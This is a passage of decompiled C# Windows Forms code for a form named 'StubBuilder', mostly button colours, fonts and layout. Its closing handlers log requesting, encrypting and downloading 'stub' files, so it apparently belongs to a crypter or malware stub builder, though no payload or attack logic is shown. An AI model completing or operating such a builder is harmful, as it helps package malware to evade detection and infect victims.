            bloom151.Value = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(40)))), ((int)(((byte)(70)))));
            bloom152.Name = "Corners";
            bloom152.Value = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(40)))), ((int)(((byte)(70)))));
            this.studioButton1.Colors = new ShitarusPrivate.Bloom[] {
        bloom140,
        bloom141,
        bloom142,
        bloom143,
        bloom144,
        bloom145,
        bloom146,
        bloom147,
        bloom148,
        bloom149,
        bloom150,
        bloom151,
        bloom152};
            this.studioButton1.Customization = "X0Et/3NVQf9zVUH/X0Et/////x7///8e////AP///xQAAAAy/////////wpGKBT/RigU/w==";
            this.studioButton1.Font = new System.Drawing.Font("Verdana", 8F);
            this.studioButton1.Image = null;
            this.studioButton1.Location = new System.Drawing.Point(629, 372);
            this.studioButton1.Name = "studioButton1";
            this.studioButton1.NoRounding = false;
            this.studioButton1.Size = new System.Drawing.Size(118, 30);
            this.studioButton1.TabIndex = 116;
            this.studioButton1.Text = "Build";
            this.studioButton1.Transparent = true;
            this.studioButton1.Click += new System.EventHandler(this.studioButton1_Click);
            // 
            // btnBrowseIcon
            // 
            this.btnBrowseIcon.Anchor = System.Windows.Forms.AnchorStyles.Top;
            bloom153.Name = "DownGradient1";
            bloom153.Value = System.Drawing.Color.FromArgb(((int)(((byte)(215)))), ((int)(((byte)(215)))), ((int)(((byte)(215)))));
            bloom154.Name = "DownGradient2";
            bloom154.Value = System.Drawing.Color.FromArgb(((int)(((byte)(235)))), ((int)(((byte)(235)))), ((int)(((byte)(235)))));
            bloom155.Name = "NoneGradient1";
            bloom155.Value = System.Drawing.Color.FromArgb(((int)(((byte)(235)))), ((int)(((byte)(235)))), ((int)(((byte)(235)))));
            bloom156.Name = "NoneGradient2";
            bloom156.Value = System.Drawing.Color.FromArgb(((int)(((byte)(215)))), ((int)(((byte)(215)))), ((int)(((byte)(215)))));
            bloom157.Name = "NoneGradient3";
            bloom157.Value = System.Drawing.Color.FromArgb(((int)(((byte)(252)))), ((int)(((byte)(252)))), ((int)(((byte)(252)))));
            bloom158.Name = "NoneGradient4";
            bloom158.Value = System.Drawing.Color.FromArgb(((int)(((byte)(242)))), ((int)(((byte)(242)))), ((int)(((byte)(242)))));
            bloom159.Name = "Glow";
            bloom159.Value = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom160.Name = "TextShade";
            bloom160.Value = System.Drawing.Color.White;
            bloom161.Name = "Text";
            bloom161.Value = System.Drawing.Color.FromArgb(((int)(((byte)(80)))), ((int)(((byte)(80)))), ((int)(((byte)(80)))));
            bloom162.Name = "Border1";
            bloom162.Value = System.Drawing.Color.White;
            bloom163.Name = "Border2";
            bloom163.Value = System.Drawing.Color.FromArgb(((int)(((byte)(180)))), ((int)(((byte)(180)))), ((int)(((byte)(180)))));
            this.btnBrowseIcon.Colors = new ShitarusPrivate.Bloom[] {
        bloom153,
        bloom154,
        bloom155,
        bloom156,
        bloom157,
        bloom158,
        bloom159,
        bloom160,
        bloom161,
        bloom162,
        bloom163};
            this.btnBrowseIcon.Customization = "19fX/+vr6//r6+v/19fX//z8/P/y8vL/////Mv////9QUFD//////7S0tP8=";
            this.btnBrowseIcon.Font = new System.Drawing.Font("Verdana", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.btnBrowseIcon.Image = null;
            this.btnBrowseIcon.Location = new System.Drawing.Point(676, 229);
            this.btnBrowseIcon.Name = "btnBrowseIcon";
            this.btnBrowseIcon.NoRounding = false;
            this.btnBrowseIcon.Size = new System.Drawing.Size(71, 30);
            this.btnBrowseIcon.TabIndex = 115;
            this.btnBrowseIcon.Text = "Browse";
            this.btnBrowseIcon.Transparent = false;
            this.btnBrowseIcon.Click += new System.EventHandler(this.btnBrowseIcon_Click);
            // 
            // label3
            // 
            this.label3.AutoSize = true;
            this.label3.BackColor = System.Drawing.Color.Transparent;
            this.label3.Font = new System.Drawing.Font("Verdana", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label3.Location = new System.Drawing.Point(36, 16);
            this.label3.Name = "label3";
            this.label3.Size = new System.Drawing.Size(53, 13);
            this.label3.TabIndex = 36;
            this.label3.Text = "Builder";
            // 
            // pictureBox1
            // 
            this.pictureBox1.BackColor = System.Drawing.Color.Transparent;
            this.pictureBox1.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox1.Image")));
            this.pictureBox1.Location = new System.Drawing.Point(0, 1);
            this.pictureBox1.Name = "pictureBox1";
            this.pictureBox1.Size = new System.Drawing.Size(42, 40);
            this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.pictureBox1.TabIndex = 35;
            this.pictureBox1.TabStop = false;
            // 
            // studioButton5
            // 
            this.studioButton5.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.studioButton5.BackColor = System.Drawing.Color.Transparent;
            bloom164.Name = "DownGradient1";
            bloom164.Value = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(65)))), ((int)(((byte)(95)))));
            bloom165.Name = "DownGradient2";
            bloom165.Value = System.Drawing.Color.FromArgb(((int)(((byte)(65)))), ((int)(((byte)(85)))), ((int)(((byte)(115)))));
            bloom166.Name = "NoneGradient1";
            bloom166.Value = System.Drawing.Color.FromArgb(((int)(((byte)(65)))), ((int)(((byte)(85)))), ((int)(((byte)(115)))));
            bloom167.Name = "NoneGradient2";
            bloom167.Value = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(65)))), ((int)(((byte)(95)))));
            bloom168.Name = "Shine1";
            bloom168.Value = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom169.Name = "Shine2A";
            bloom169.Value = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom170.Name = "Shine2B";
            bloom170.Value = System.Drawing.Color.Transparent;
            bloom171.Name = "Shine3";
            bloom171.Value = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom172.Name = "TextShade";
            bloom172.Value = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            bloom173.Name = "Text";
            bloom173.Value = System.Drawing.Color.White;
            bloom174.Name = "Glow";
            bloom174.Value = System.Drawing.Color.FromArgb(((int)(((byte)(10)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom175.Name = "Border";
            bloom175.Value = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(40)))), ((int)(((byte)(70)))));
            bloom176.Name = "Corners";
            bloom176.Value = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(40)))), ((int)(((byte)(70)))));
            this.studioButton5.Colors = new ShitarusPrivate.Bloom[] {
        bloom164,
        bloom165,
        bloom166,
        bloom167,
        bloom168,
        bloom169,
        bloom170,
        bloom171,
        bloom172,
        bloom173,
        bloom174,
        bloom175,
        bloom176};
            this.studioButton5.Customization = "X0Et/3NVQf9zVUH/X0Et/////x7///8e////AP///xQAAAAy/////////wpGKBT/RigU/w==";
            this.studioButton5.Font = new System.Drawing.Font("Verdana", 8F);
            this.studioButton5.Image = null;
            this.studioButton5.Location = new System.Drawing.Point(1065, -4);
            this.studioButton5.Name = "studioButton5";
            this.studioButton5.NoRounding = false;
            this.studioButton5.Size = new System.Drawing.Size(13, 30);
            this.studioButton5.TabIndex = 21;
            this.studioButton5.Transparent = true;
            this.studioButton5.Click += new System.EventHandler(this.studioButton5_Click);
            // 
            // studioButton4
            // 
            this.studioButton4.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.studioButton4.BackColor = System.Drawing.Color.Transparent;
            bloom177.Name = "DownGradient1";
            bloom177.Value = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(65)))), ((int)(((byte)(95)))));
            bloom178.Name = "DownGradient2";
            bloom178.Value = System.Drawing.Color.FromArgb(((int)(((byte)(65)))), ((int)(((byte)(85)))), ((int)(((byte)(115)))));
            bloom179.Name = "NoneGradient1";
            bloom179.Value = System.Drawing.Color.FromArgb(((int)(((byte)(65)))), ((int)(((byte)(85)))), ((int)(((byte)(115)))));
            bloom180.Name = "NoneGradient2";
            bloom180.Value = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(65)))), ((int)(((byte)(95)))));
            bloom181.Name = "Shine1";
            bloom181.Value = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom182.Name = "Shine2A";
            bloom182.Value = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom183.Name = "Shine2B";
            bloom183.Value = System.Drawing.Color.Transparent;
            bloom184.Name = "Shine3";
            bloom184.Value = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom185.Name = "TextShade";
            bloom185.Value = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            bloom186.Name = "Text";
            bloom186.Value = System.Drawing.Color.White;
            bloom187.Name = "Glow";
            bloom187.Value = System.Drawing.Color.FromArgb(((int)(((byte)(10)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom188.Name = "Border";
            bloom188.Value = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(40)))), ((int)(((byte)(70)))));
            bloom189.Name = "Corners";
            bloom189.Value = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(40)))), ((int)(((byte)(70)))));
            this.studioButton4.Colors = new ShitarusPrivate.Bloom[] {
        bloom177,
        bloom178,
        bloom179,
        bloom180,
        bloom181,
        bloom182,
        bloom183,
        bloom184,
        bloom185,
        bloom186,
        bloom187,
        bloom188,
        bloom189};
            this.studioButton4.Customization = "X0Et/3NVQf9zVUH/X0Et/////x7///8e////AP///xQAAAAy/////////wpGKBT/RigU/w==";
            this.studioButton4.Font = new System.Drawing.Font("Verdana", 8F);
            this.studioButton4.Image = null;
            this.studioButton4.Location = new System.Drawing.Point(1046, -4);
            this.studioButton4.Name = "studioButton4";
            this.studioButton4.NoRounding = false;
            this.studioButton4.Size = new System.Drawing.Size(13, 30);
            this.studioButton4.TabIndex = 20;
            this.studioButton4.Transparent = true;
            this.studioButton4.Click += new System.EventHandler(this.studioButton4_Click);
            // 
            // StubBuilder
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(1090, 646);
            this.Controls.Add(this.primeTheme1);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
            this.MinimizeBox = false;
            this.Name = "StubBuilder";
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "Builder";
            this.TransparencyKey = System.Drawing.Color.Fuchsia;
            this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.FrmBuilder_FormClosing);
            this.Load += new System.EventHandler(this.FrmBuilder_Load);
            this.primeTheme1.ResumeLayout(false);
            this.primeTheme1.PerformLayout();
            this.ambianceTabControl1.ResumeLayout(false);
            this.tabPage1.ResumeLayout(false);
            this.tabPage1.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBoxicon)).EndInit();
            this.tabPage2.ResumeLayout(false);
            this.tabPage2.PerformLayout();
            this.tabPage3.ResumeLayout(false);
            this.tabPage3.PerformLayout();
            this.groupBox1.ResumeLayout(false);
            this.groupBox1.PerformLayout();
            this.tabPage4.ResumeLayout(false);
            this.tabPage4.PerformLayout();
            this.groupBox2.ResumeLayout(false);
            this.groupBox2.PerformLayout();
            this.groupBox3.ResumeLayout(false);
            this.groupBox3.PerformLayout();
            this.tabPage5.ResumeLayout(false);
            this.tabPage5.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox5)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox4)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox3)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox2)).EndInit();
            this.tabPage6.ResumeLayout(false);
            this.tabPage6.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.iconPreview)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).EndInit();
            this.ResumeLayout(false);

        }

        [CompilerGenerated]
        private async Task _Build_b__10_0()
        {
            await Main_Loop();
        }

        [CompilerGenerated]
        private void _Main_Loop_b__53_0()
        {
            listBox2.Items.Add("Selected Stub Net2... ");
            listBox2.Items.Add("Requesting Stub file... ");
        }

        [CompilerGenerated]
        private void _Main_Loop_b__53_1()
        {
            listBox2.Items.Add("Encrypting... ");
        }

        [CompilerGenerated]
        private void _Main_Loop_b__53_2()
        {
            listBox2.Items.Add("Downloaded");
        }

        [CompilerGenerated]
        private void _Main_Loop_b__53_3()
        {
            listBox2.Items.Add("Selected Stub Net4... ");
            listBox2.Items.Add("Requesting Stub file... ");
        }

        [CompilerGenerated]
        private void _Main_Loop_b__53_4()
        {
            listBox2.Items.Add("Encrypting... ");
        }

        [CompilerGenerated]
        private void _Main_Loop_b__53_5()
        {
            listBox2.Items.Add("Downloaded");
        }
    }
}
